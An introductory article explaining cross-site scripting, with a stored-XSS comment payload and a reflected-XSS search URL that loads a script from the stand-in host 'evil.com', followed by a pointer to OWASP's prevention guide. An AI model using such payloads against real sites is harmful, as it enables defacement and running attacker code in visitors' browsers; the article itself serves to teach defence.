---
title: What is XSS injection?
description: An intro to XSS injection, and tips on mitigating such attacks.
date_created: 2014-03-28
---

XSS injection (XSS stands for Cross-Site Scripting) works a bit like SQL injection: improperly sanitized user-submitted data is used to alter the application's functionality. Instead of altering SQL queries, XSS injection alters HTML and JavaScript.

For example, a hacker could leave the following comment on a vulnerable site:

```html
<script>alert('Your site was hacked!');</script>
```

When the site displays the comments, it also serves the hacker's malicious code:

```html
<div class='comment'>
 John Johnson said:
 What a great site! Thank you for this article!
</div>
<div class='comment'>
 CleverHacker said:
 <script>alert('Your site was hacked!');</script>
</div>
```

In the example above, all sites visitors would see a popup that says "Your site was hacked". Far more potent attacks have been used to deface important websites.

It is called **persistent** or **stored XSS** when the server stores the malicious code and serves it to the users as in our example above. When the attack is performed by injecting the code in invalid URL parameters, it is called **non-persistent XSS**.

The following example shows how a non-persistent XSS attack is performed. In this example, Bob sends Alice the following URL:

```
http://news.org/search/?q=<script src='evil.com/hack.js'></script>
```

Since the page displays the search query, the `<script>` tag will be executed and the malicious JavaScript file will be loaded:

```html
<h1>
 Showing results for query <script src='evil.com/hack.js'></script>
</h1>
```

XSS injection can be preventing by properly sanitizing any user-provided data. OWASP has [an excellent guide](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet) on securing your applications against XSS.

